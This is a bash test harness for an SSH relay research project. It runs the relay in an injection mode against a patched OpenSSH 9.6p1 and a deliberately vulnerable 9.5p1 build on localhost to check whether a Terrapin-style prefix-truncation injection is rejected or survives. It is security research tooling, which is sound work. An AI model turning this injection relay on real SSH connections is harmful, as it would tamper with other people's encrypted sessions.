#!/usr/bin/env bash
# Local (no-Docker) end-to-end test of the relay against real sshd binaries
# started in-process. Produces the checkable traces referenced in the
# project write-up. See README.md "Local dev loop (no Docker)" for the
# one-time setup this script assumes (test sshd configs under
# /home/claude/sshd_test and /home/claude/sshd_955, or your own paths --
# override via the env vars below).
set -uo pipefail
cd "$(dirname "$0")/.."

PATCHED_SSHD_CONFIG="${PATCHED_SSHD_CONFIG:-/home/claude/sshd_test/etc/sshd_config}"   # OpenSSH >=9.6, strict-kex capable
PATCHED_BACKEND_PORT="${PATCHED_BACKEND_PORT:-2200}"
LEGACY_SSHD_BIN="${LEGACY_SSHD_BIN:-/opt/openssh-9.5p1/sbin/sshd}"                      # OpenSSH 9.5p1, pre-strict-kex (vulnerable)
LEGACY_SSHD_CONFIG="${LEGACY_SSHD_CONFIG:-/home/claude/sshd_955/etc/sshd_config}"
LEGACY_BACKEND_PORT="${LEGACY_BACKEND_PORT:-2201}"
LEGACY_SSH_BIN="${LEGACY_SSH_BIN:-/opt/openssh-9.5p1/bin/ssh}"
RELAY_PORT="${RELAY_PORT:-2222}"
KEY="keys/client_id_ed25519"

mkdir -p /run/sshd logs

run_scenario() {
    local name="$1" mode="$2" sshd_bin="$3" sshd_config="$4" backend_port="$5" ssh_bin="$6"
    local logfile="logs/${name}.jsonl"
    echo ""
    echo "=== SCENARIO: ${name} (mode=${mode}) ==="

    "${sshd_bin}" -f "${sshd_config}" -D &
    local sshd_pid=$!
    sleep 1

    rm -f "${logfile}"
    python3 relay/relay.py \
        --listen-host 127.0.0.1 --listen-port "${RELAY_PORT}" \
        --backend-host 127.0.0.1 --backend-port "${backend_port}" \
        --mode "${mode}" \
        --log-file "${logfile}" \
        --once > "logs/${name}_stdout.log" 2>&1 &
    local relay_pid=$!
    sleep 1

    "${ssh_bin}" -i "${KEY}" \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
        -p "${RELAY_PORT}" root@127.0.0.1 -- "echo OK"
    echo "  ssh client exit code: $?"

    wait "${relay_pid}" 2>/dev/null
    kill "${sshd_pid}" 2>/dev/null
    wait "${sshd_pid}" 2>/dev/null

    echo "  --- trace: ${logfile} ---"
    python3 -c "
import json
for line in open('${logfile}'):
    r = json.loads(line)
    print(f\"  {r['event']:20s} {r.get('direction') or '':20s} {r.get('msg_name') or '':25s} {r.get('note') or ''}\")
"
}

echo "############################################################"
echo "# 1. Baseline: passthrough, patched (9.6p1) pairing"
echo "############################################################"
run_scenario "01_passthrough_baseline" passthrough \
    /usr/sbin/sshd "${PATCHED_SSHD_CONFIG}" "${PATCHED_BACKEND_PORT}" /usr/bin/ssh
if grep -q '"event": "handshake_complete"' logs/01_passthrough_baseline.jsonl; then
    echo "PASS: passthrough handshake completed with zero relay modifications."
else
    echo "FAIL: passthrough handshake did not complete."
fi

echo ""
echo "############################################################"
echo "# 2. Sanity check, patched (9.6p1) pairing -- expect REJECTED"
echo "############################################################"
run_scenario "02_inject_patched_pairing" inject_ignore \
    /usr/sbin/sshd "${PATCHED_SSHD_CONFIG}" "${PATCHED_BACKEND_PORT}" /usr/bin/ssh
python3 scripts/check_log.py logs/02_inject_patched_pairing.jsonl --expect rejected

if [[ -x "${LEGACY_SSHD_BIN}" ]]; then
    echo ""
    echo "############################################################"
    echo "# 3. Sanity check, genuine pre-patch (9.5p1) pairing -- expect SURVIVE"
    echo "############################################################"
    run_scenario "03_inject_legacy_pairing" inject_ignore \
        "${LEGACY_SSHD_BIN}" "${LEGACY_SSHD_CONFIG}" "${LEGACY_BACKEND_PORT}" "${LEGACY_SSH_BIN}"
    python3 scripts/check_log.py logs/03_inject_legacy_pairing.jsonl --expect survive
    echo ""
    echo "  NOTE: the ssh client above is expected to still report an error --"
    echo "  the handshake itself survives (see trace), but the first real"
    echo "  encrypted message fails to decrypt, because this harness only"
    echo "  implements the injection half of the attack (RcvIncrease)."
    echo "  Pairing it with a compensating deletion of one server->client"
    echo "  message (full prefix truncation) is the bounded-contribution /"
    echo "  Metasploit-module work -- see the project write-up, Section 3."
else
    echo ""
    echo "[skipped] scenario 3 requires a pre-patch OpenSSH build at ${LEGACY_SSHD_BIN}."
    echo "          See README.md 'Building a genuinely vulnerable OpenSSH for local testing'."
fi

echo ""
echo "=== all scenarios complete; logs in logs/0*.jsonl ==="
